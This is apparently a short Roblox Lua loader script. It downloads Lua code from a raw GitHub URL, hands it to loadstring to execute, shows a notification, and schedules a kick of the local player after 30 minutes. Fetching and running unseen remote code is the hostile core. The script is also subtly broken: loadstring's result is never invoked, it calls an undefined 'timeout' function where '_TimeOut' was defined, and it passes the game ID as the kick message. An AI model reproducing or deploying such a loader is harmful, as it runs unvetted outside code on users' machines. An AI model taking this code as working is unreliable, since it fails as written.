repeat wait() until game:IsLoaded() and game.Players.LocalPlayer

local HttpService = game:GetService("HttpService")
local UI = game:GetService("StarterGui")
local gameId = game.GameId

function _Notify(message)
    UI:SetCore("SendNotification", {
        Title = "NOTIFICATION!",
        Text = message,
        Duration = 99999,
        Button1 = "OK"
    })
end

function _TimeOut(seconds, func)
    spawn(function()
        wait(seconds)
        func()
    end)
end


local success, result = pcall(function()
    return HttpService:GetAsync("https://raw.githubusercontent.com/1st-Mars/Annie/main/1st.lua") -- Provide a URL here for GetAsync() if needed
end)

if success then
    loadstring(result) -- If the GetAsync call succeeds, attempt to execute the result
    _Notify("Script Succesfuly Loaded!")
else
    _Notify("Error Occurred: " .. tostring(result)) -- Display error notification if GetAsync encounters an error
end


timeout(1800, function()
    game.Players.LocalPlayer:Kick(gameId)
end)

